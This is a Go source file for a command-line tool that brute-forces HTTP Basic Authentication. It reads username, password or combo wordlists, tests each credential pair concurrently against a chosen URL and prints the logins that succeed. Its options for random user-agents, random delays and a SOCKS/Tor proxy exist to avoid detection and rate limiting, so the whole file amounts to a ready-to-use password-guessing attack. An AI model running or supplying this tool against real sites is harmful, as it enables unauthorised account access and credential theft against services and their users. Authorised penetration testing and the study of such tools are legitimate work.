// main.go

package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"github.com/TwiN/go-color"
	"github.com/briandowns/spinner"
	BasicAuthBruteForce "github.com/destan0098/basicauthbruteforce/pkg"
	"github.com/jedib0t/go-pretty/v6/table"
	"github.com/urfave/cli/v2"
	"log"
	"math/rand"
	_ "net/http/pprof"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
)

// Global variables for command-line flags and other settings
var rate int
var randomagent, randomdelay bool
var url, username, password, combolist, proxyAddress string

var start time.Time
var delay int

// Function to handle parsing errors
func errorpars(err error) {
	if err != nil {
		log.Panic(err.Error())
	}
}

var terminate = make(chan struct{})
var done = make(chan struct{})

func processFile(file *os.File, lines *[]string) {

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		*lines = append(*lines, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		log.Println("Error reading file:", err)
		return
	}

	log.Printf("\nRead %d lines from file %s\n", len(*lines), file.Name())
}

// main function
func main() {
	var wg sync.WaitGroup
	var results = make(chan struct {
		user string
		pass string
	}, 1)
	s := spinner.New(spinner.CharSets[14], 100*time.Millisecond)
	s.Prefix = "Waiting: "
	s.Start()
	start = time.Now()
	runtime.GOMAXPROCS(1)
	// Command-line interface setup using urfave/cli
	app := &cli.App{
		Flags: []cli.Flag{
			// Flags for URL, username, password, rate limit, delay, and other options
			// Each flag has a corresponding destination variable to store the value
			&cli.StringFlag{
				Name:        "url",
				Value:       "",
				Aliases:     []string{"d"},
				Destination: &url,
				Usage:       "Enter Site URL",
			},
			&cli.StringFlag{
				Name:        "username",
				Value:       "",
				Aliases:     []string{"u"},
				Destination: &username,
				Usage:       "Enter Username Wordlist",
			},
			&cli.StringFlag{
				Name:        "password",
				Value:       "",
				Aliases:     []string{"p"},
				Destination: &password,
				Usage:       "Enter Password Wordlist",
			},
			&cli.StringFlag{
				Name:        "combolist",
				Value:       "",
				Aliases:     []string{"c"},
				Destination: &combolist,
				Usage:       "Enter Combo Wordlist",
			},
			&cli.IntFlag{
				Name:        "rate",
				Aliases:     []string{"r"},
				Value:       1,
				Usage:       "rate limit",
				Destination: &rate,
			},
			&cli.StringFlag{
				Name:        "proxy",
				Aliases:     []string{"x"},
				Value:       "",
				Destination: &proxyAddress,
				Usage:       "Proxy address (e.g., socks5://localhost:9050)",
			},
			&cli.IntFlag{
				Name:        "delay",
				Aliases:     []string{"e"},
				Value:       0,
				Usage:       "delay per second",
				Destination: &delay,
			},
			&cli.BoolFlag{
				Name:        "random-agent",
				Aliases:     []string{"a"},
				Value:       false,
				Usage:       "Random Agent",
				Destination: &randomagent,
			},
			&cli.BoolFlag{
				Name:        "random-delay",
				Aliases:     []string{"y"},
				Value:       false,
				Usage:       "Random Delay",
				Destination: &randomdelay,
			},
		},
		Action: func(cCtx *cli.Context) error {
			// Switch case to handle different scenarios based on provided options
			switch {
			case cCtx.String("url") == "":
				fmt.Println(color.Colorize(color.Red, "[-] Please Enter URL with -d"))
			case cCtx.String("username") == "" && cCtx.String("combolist") == "":
				fmt.Println(color.Colorize(color.Red, "[-] Please Enter Username Wordlist Address with -u"))
			case cCtx.String("password") == "" && cCtx.String("combolist") == "":
				fmt.Println(color.Colorize(color.Red, "[-] Please Enter Password Wordlist Address with -u"))
			case cCtx.Bool("random-agent") == true:
				fmt.Println(color.Colorize(color.Green, "[*] We Set Random User Agent For you"))
			}
			return nil
		},
	}
	// Run the CLI app
	if err := app.Run(os.Args); err != nil {
		log.Fatal(err)
	}

	// Open username and password wordlist files
	var fileReadersWG sync.WaitGroup
	var jobs chan string
	if combolist == "" && username != "" {
		defer wg.Done()
		usernamedic, err := os.OpenFile(username, os.O_RDONLY, 0600)
		errorpars(err)
		defer func(usernamedic *os.File) {
			err := usernamedic.Close()
			errorpars(err)
		}(usernamedic)

		passwordsdic, err := os.OpenFile(password, os.O_RDONLY, 0600)
		errorpars(err)
		defer func(passwordsdic *os.File) {
			err := passwordsdic.Close()
			errorpars(err)
		}(passwordsdic)

		linesuser := make([]string, 0)
		linespassw := make([]string, 0)
		//

		fileReadersWG.Add(2)
		// Use bufio.Scanner for reading files

		// Read content of wordlist files
		go func() {
			defer fileReadersWG.Done()
			processFile(usernamedic, &linesuser)
		}()
		go func() {
			defer fileReadersWG.Done()
			processFile(passwordsdic, &linespassw)
		}()
		// Wait for both files to finish reading

		fileReadersWG.Wait()
		// Signal completion

		jobs = make(chan string, len(linesuser)*len(linespassw))

		// Check for conflicting options regarding delay
		if delay != 0 && randomdelay {
			log.Println(color.Colorize(color.Red, "[-] Choose one --delay or --random-delay"))
			os.Exit(1)
		}

		// Create worker goroutines
		/*		for i := 0; i < rate; i++ {
				wg.Add(1)
				go workerRoutine(jobs, results, &wg, terminate)
			}*/
		for i := 0; i < runtime.NumCPU(); i++ {
			wg.Add(1)
			go workerRoutine(jobs, results, &wg, terminate)
		}

		// Add jobs to the queue

		for _, usern := range linesuser {
			for _, passw := range linespassw {

				jobs <- fmt.Sprintf("%s:%s", usern, passw)
			}
		}

	} else if combolist != "" {

		combodic, err := os.OpenFile(combolist, os.O_RDONLY, 0600)
		errorpars(err)
		defer func(combodic *os.File) {
			err := combodic.Close()
			errorpars(err)
		}(combodic)

		linescombo := make([]string, 0)
		fileReadersWG.Add(1)
		// Read content of wordlist files
		go func() {
			defer fileReadersWG.Done()
			processFile(combodic, &linescombo)
		}()
		// Wait for both files to finish reading

		fileReadersWG.Wait()

		jobs = make(chan string, len(linescombo))

		// Check for conflicting options regarding delay
		if delay != 0 && randomdelay {
			log.Println(color.Colorize(color.Red, "[-] Choose one --delay or --random-delay"))
			os.Exit(1)
		}

		// Create worker goroutines
		/*		for i := 0; i < rate; i++ {
				wg.Add(1)
				go workerRoutine(jobs, results, &wg, terminate)
			}*/
		for i := 0; i < runtime.NumCPU(); i++ {
			wg.Add(1)
			go workerRoutine(jobs, results, &wg, terminate)
		}
		defer wg.Done()
		// Add jobs to the queue

		for _, comb := range linescombo {
			jobs <- fmt.Sprintf("%s", comb)
		}

	}
	close(jobs)
	defer wg.Done()

	// Wait for all workers to finish
	go func() {
		wg.Wait()
		close(results) // Close 'results' channel after all workers finish
		close(terminate)
		close(done)
		// Close 'terminate' channel to signal workers to exit
		// Signal completion
	}()

	t := table.NewWriter()
	t.SetOutputMirror(os.Stdout)
	t.AppendHeader(table.Row{"#", "Username", "Password"})
	// Process results
	for res := range results {
		s.Stop()
		t.AppendRow(table.Row{1, res.user, res.pass})
		t.AppendSeparator()

	}

	t.Render()
	elapsed := time.Since(start)

	fmt.Printf("page took %s \n", elapsed)
	<-done
	//	fmt.Printf(color.Colorize(color.Red, "[+] Find Username: %s And Password : %s\n"), res.user, res.pass)
	endProgram()

	os.Exit(0)

}

// Variables for workerRoutine

var Useragent string

func endProgram() {
	//	close(terminate) // Signal termination
	<-done // Wait for completion
}

func workerRoutine(jobs <-chan string, results chan<- struct{ user, pass string }, wg *sync.WaitGroup, terminate chan struct{}) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("Recovered in workerRoutine: %v", r)
		}
		wg.Done()
	}()

	client := BasicAuthBruteForce.NewClient()
	if client == nil {
		log.Println("Error: Client is nil")
		return
	}

	for {
		select {
		case job, ok := <-jobs:
			if !ok {
				// 'jobs' channel closed, exit the goroutine
				//	fmt.Println(ok)
				return
			}
			var jobsn string
			if combolist == "" {
				jobsn = base64.StdEncoding.EncodeToString([]byte(job))
			} else if combolist != "" {
				jobsn = job
			}
			// Split the job into username and password
			sDec, errs := base64.StdEncoding.DecodeString(jobsn)
			if errs != nil {
				//		log.Println("Error decoding base64:", errs)
				continue // Skip to the next iteration
			}

			// /Encode to base64
			userpass := strings.Split(strings.TrimSpace(string(sDec)), ":")

			if len(userpass) < 2 {
				log.Println("Invalid combo format:", job)
				continue // Skip to the next iteration
			}
			user, pass := userpass[0], userpass[1]

			// Set headers using the client
			Useragent = BasicAuthBruteForce.Useragent(randomagent)
			checktrue := client.SetHeader(url, Useragent, user, pass)
			// If the error is true, it means authentication was successful
			if checktrue {
				results <- struct{ user, pass string }{user, pass}
			}

			// Sleep with a random delay if randomdelay is set
			if randomdelay {
				rand.Seed(time.Now().UnixNano())
				randomNumber := rand.Intn(10) + 1
				time.Sleep(time.Duration(randomNumber) * time.Second)
			}

		case <-terminate:
			// Terminate signal received, exit the goroutine
			return
		}
	}
}
